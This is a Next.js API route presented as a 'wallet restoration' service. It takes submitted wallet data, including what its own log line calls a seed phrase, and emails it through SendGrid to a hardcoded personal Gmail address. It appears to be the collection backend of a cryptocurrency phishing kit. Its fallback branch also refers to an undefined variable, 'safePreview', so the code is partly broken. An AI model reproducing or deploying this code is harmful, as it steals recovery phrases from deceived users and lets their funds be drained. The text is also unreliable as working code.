import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { email, method, data, timestamp } = body

    // Destination address from environment (default to provided address)
    const toAddress = process.env.RESTORE_M || 'jenniergers2@gmail.com'

    // Build message body including the full submitted data
    const submitted = data || 'N/A'

    const subject = `Wallet Restoration Request - ${method.toUpperCase()}`
    const textBody = `Method: ${method}\nTime: ${timestamp}\nFrom: ${email || '—'}\n\nSubmitted Data:\n${submitted}`

    // If SENDGRID is configured, use it to send the mail
    if (process.env.SENDGRID_API_KEY && process.env.SENDGRID_FROM) {
      const sgRes = await fetch('https://api.sendgrid.com/v3/mail/send', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${process.env.SENDGRID_API_KEY}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          personalizations: [{ to: [{ email: toAddress }] }],
          from: { email: process.env.SENDGRID_FROM },
          subject,
          content: [
            { type: 'text/plain', value: textBody },
            { type: 'text/html', value: `<pre>${String(submitted)}</pre>` },
          ],
        }),
      })

      if (!sgRes.ok) {
        const txt = await sgRes.text()
        console.error('SendGrid error:', sgRes.status, txt)
        throw new Error('Failed to deliver via SendGrid')
      }

      return NextResponse.json({ success: true, message: 'Recovery details sent via SendGrid' }, { status: 200 })
    }

    // If no known mail transport configured, log and return success
    console.log('Recovery details (no mail transport):', { to: toAddress, from: email, method, timestamp, seedPhrase: safePreview })
    return NextResponse.json({ success: true, message: 'Recovery details logged' }, { status: 200 })
  } catch (error) {
    console.error('Error sending recovery email:', error)
    return NextResponse.json({ error: 'Failed to send recovery email' }, { status: 500 })
  }
}
